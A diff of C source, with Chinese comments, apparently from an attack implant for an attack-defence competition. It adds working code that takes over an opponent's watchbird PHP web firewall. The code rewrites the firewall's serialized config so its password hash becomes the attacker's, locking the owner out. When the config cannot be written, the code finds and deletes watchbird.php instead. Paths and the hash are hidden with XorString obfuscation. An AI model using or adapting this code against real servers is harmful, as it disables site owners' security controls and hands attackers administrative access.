@@ -441,104 +441,183 @@ static void scan_and_clean_php(const char *dir, time_t boot_time)
 }
 
 /*
+ * find_and_remove_watchbird：在 WWWROOT 中定位并删除敌方 watchbird.php。
+ *
+ * 策略：
+ *   1. 先检查 WWWROOT/watchbird.php，存在则直接删除
+ *   2. 若不存在，遍历 WWWROOT 下最多 5 个 .php 文件，读取头部
+ *      查找 watchbird install 注入的 include_once/require_once 路径
+ *      提取出被 include 的 watchbird.php 路径并删除
+ */
+static void find_and_remove_watchbird()
+{
+    char wb_php[512];
+    struct stat st;
+
+    /* 策略 1：直接检查默认路径 */
+    snprintf(wb_php, sizeof(wb_php), "%swatchbird.php", XorString(WWWROOT));
+    if (stat(wb_php, &st) == 0 && S_ISREG(st.st_mode))
+    {
+        remove(wb_php);
+        return;
+    }
+
+    /* 策略 2：遍历 WWWROOT 下最多 5 个 php 文件，从 include_once 中提取路径 */
+    DIR *d = opendir(XorString(WWWROOT));
+    if (!d) return;
+
+    struct dirent *ent;
+    int checked = 0;
+    char filepath[512];
+    char buf[4096];
+
+    while ((ent = readdir(d)) != NULL && checked < 5)
+    {
+        const char *dot = strrchr(ent->d_name, '.');
+        if (!dot) continue;
+        if (strcmp(dot, ".php") != 0 && strcmp(dot, ".php5") != 0 &&
+            strcmp(dot, ".phtml") != 0)
+            continue;
+
+        snprintf(filepath, sizeof(filepath), "%s%s", XorString(WWWROOT), ent->d_name);
+        if (stat(filepath, &st) != 0 || !S_ISREG(st.st_mode))
+            continue;
+
+        int fd = open(filepath, O_RDONLY);
+        if (fd < 0) continue;
+        int n = read(fd, buf, sizeof(buf) - 1);
+        close(fd);
+        if (n <= 0) continue;
+        buf[n] = '\0';
+        checked++;
+
+        const char *patterns[] = {
+            "include_once '", "require_once '",
+            "include_once \"", "require_once \"",
+            NULL
+        };
+        int i;
+        for (i = 0; patterns[i]; i++)
+        {
+            const char *pos = strstr(buf, patterns[i]);
+            if (!pos) continue;
+
+            char quote = patterns[i][strlen(patterns[i]) - 1];
+            const char *path_start = pos + strlen(patterns[i]);
+            const char *path_end = strchr(path_start, quote);
+            if (!path_end || path_end - path_start <= 0 ||
+                path_end - path_start >= (int)sizeof(wb_php))
+                continue;
+
+            int plen = path_end - path_start;
+            memcpy(wb_php, path_start, plen);
+            wb_php[plen] = '\0';
+
+            if (strstr(wb_php, "watchbird"))
+            {
+                remove(wb_php);
+                closedir(d);
+                return;
+            }
+        }
+    }
+    closedir(d);
+}
+
+/*
  * hijack_enemy_watchbird：劫持敌方部署的 watchbird WAF。
  *
- * 不删除 watchbird，而是篡改其配置文件中的 password_sha1，
- * 使敌方无法登录控制面板，而我们可以用自定义密码登录。
+ * 优先篡改配置文件中的 password_sha1，使敌方被锁死，我们可以登录。
+ * 如果配置文件无写权限（写入失败），则 fallback 到查找并删除 watchbird.php。
  *
  * watchbird 配置文件格式为 PHP serialize，password_sha1 字段格式：
  *   s:14:"password_sha1";s:40:"原始SHA1值";
  * 或初始状态：
  *   s:14:"password_sha1";s:5:"unset";
- *
- * 我们读取整个配置文件，找到 password_sha1 后的字符串值并替换为
- * WB_PASSWORD_SHA1 (40字节 SHA1)。
  */
 static void hijack_enemy_watchbird()
 {
     /* 读取配置文件 */
     struct stat st;
     if (stat(XorString(WB_CONF_PATH), &st) != 0 || !S_ISREG(st.st_mode))
-        return;
+        goto fallback;
     if (st.st_size <= 0 || st.st_size > 65536)
-        return;
+        goto fallback;
 
-    int fd = open(XorString(WB_CONF_PATH), O_RDONLY);
-    if (fd < 0) return;
-    char *buf = (char *)malloc(st.st_size + 1);
-    int n = read(fd, buf, st.st_size);
-    close(fd);
-    if (n <= 0) { free(buf); return; }
-    buf[n] = '\0';
-
-    /*
-     * 在 serialize 字符串中定位 password_sha1 的值。
-     * 格式: ...s:14:"password_sha1";s:NN:"值";...
-     * 查找 "password_sha1" 标记，然后定位后面的 s:NN:"..." 字符串值
-     */
-    const char *marker = "\"password_sha1\"";
-    char *pos = strstr(buf, marker);
-    if (!pos) { free(buf); return; }
-    pos += strlen(marker);
-
-    /* 跳到下一个 s:NN:" 结构 */
-    char *s_pos = strstr(pos, "s:");
-    if (!s_pos) { free(buf); return; }
-
-    /* 找到值的左引号 */
-    char *quote_start = strchr(s_pos + 2, '"');
-    if (!quote_start) { free(buf); return; }
-    quote_start++; /* 跳过 " */
-
-    /* 找到值的右引号 */
-    char *quote_end = strchr(quote_start, '"');
-    if (!quote_end) { free(buf); return; }
-
-    /* 检查当前值是否已经是我们的密码 */
-    const char *our_sha1 = XorString(WB_PASSWORD_SHA1);
-    int old_len = quote_end - quote_start;
-    int new_len = strlen(our_sha1); /* 40 */
-
-    if (old_len == new_len && memcmp(quote_start, our_sha1, new_len) == 0)
     {
-        free(buf); /* 已经是我们的密码，无需修改 */
-        return;
-    }
-
-    /*
-     * 构造新的配置文件内容：
-     *   前缀 + 修正后的 s:40:"our_sha1" + 后缀
-     *
-     * 需要同时修正 s:NN 中的长度数字 NN
-     */
-    /* s_pos 指向 s:NN:"old_val"; 我们需要替换整个 s:NN:"..." 部分 */
-    char *val_end = quote_end + 1; /* 指向右引号后的 ; */
-
-    int prefix_len = s_pos - buf;
-    int suffix_len = n - (val_end - buf);
-
-    /* 构造新的值片段: s:40:"sha1hex" */
-    char new_val[128];
-    snprintf(new_val, sizeof(new_val), "s:%d:\"%s\"", new_len, our_sha1);
-    int new_val_len = strlen(new_val);
-
-    int total = prefix_len + new_val_len + suffix_len;
-    char *newbuf = (char *)malloc(total + 1);
-    memcpy(newbuf, buf, prefix_len);
-    memcpy(newbuf + prefix_len, new_val, new_val_len);
-    memcpy(newbuf + prefix_len + new_val_len, val_end, suffix_len);
-    newbuf[total] = '\0';
-
-    /* 写回配置文件 */
-    fd = open(XorString(WB_CONF_PATH), O_WRONLY | O_CREAT | O_TRUNC, 0644);
-    if (fd >= 0)
-    {
-        write(fd, newbuf, total);
+        int fd = open(XorString(WB_CONF_PATH), O_RDONLY);
+        if (fd < 0) goto fallback;
+        char *buf = (char *)malloc(st.st_size + 1);
+        int n = read(fd, buf, st.st_size);
         close(fd);
+        if (n <= 0) { free(buf); goto fallback; }
+        buf[n] = '\0';
+
+        /*
+         * 在 serialize 字符串中定位 password_sha1 的值。
+         * 格式: ...s:14:"password_sha1";s:NN:"值";...
+         */
+        const char *marker = "\"password_sha1\"";
+        char *pos = strstr(buf, marker);
+        if (!pos) { free(buf); goto fallback; }
+        pos += strlen(marker);
+
+        char *s_pos = strstr(pos, "s:");
+        if (!s_pos) { free(buf); goto fallback; }
+
+        char *quote_start = strchr(s_pos + 2, '"');
+        if (!quote_start) { free(buf); goto fallback; }
+        quote_start++;
+
+        char *quote_end = strchr(quote_start, '"');
+        if (!quote_end) { free(buf); goto fallback; }
+
+        const char *our_sha1 = XorString(WB_PASSWORD_SHA1);
+        int old_len = quote_end - quote_start;
+        int new_len = strlen(our_sha1);
+
+        if (old_len == new_len && memcmp(quote_start, our_sha1, new_len) == 0)
+        {
+            free(buf); /* 已经是我们的密码 */
+            return;
+        }
+
+        char *val_end = quote_end + 1;
+        int prefix_len = s_pos - buf;
+        int suffix_len = n - (val_end - buf);
+
+        char new_val[128];
+        snprintf(new_val, sizeof(new_val), "s:%d:\"%s\"", new_len, our_sha1);
+        int new_val_len = strlen(new_val);
+
+        int total = prefix_len + new_val_len + suffix_len;
+        char *newbuf = (char *)malloc(total + 1);
+        memcpy(newbuf, buf, prefix_len);
+        memcpy(newbuf + prefix_len, new_val, new_val_len);
+        memcpy(newbuf + prefix_len + new_val_len, val_end, suffix_len);
+        newbuf[total] = '\0';
+
+        /* 写回配置文件 */
+        fd = open(XorString(WB_CONF_PATH), O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (fd < 0)
+        {
+            /* 无写权限，fallback 删除 watchbird.php */
+            free(buf);
+            free(newbuf);
+            goto fallback;
+        }
+        int written = write(fd, newbuf, total);
+        close(fd);
+        free(buf);
+        free(newbuf);
+
+        if (written == total)
+            return; /* 劫持成功 */
     }
 
-    free(buf);
-    free(newbuf);
+fallback:
+    /* 配置文件不可写，退而删除 watchbird.php 本体 */
+    find_and_remove_watchbird();
 }
 
 /*
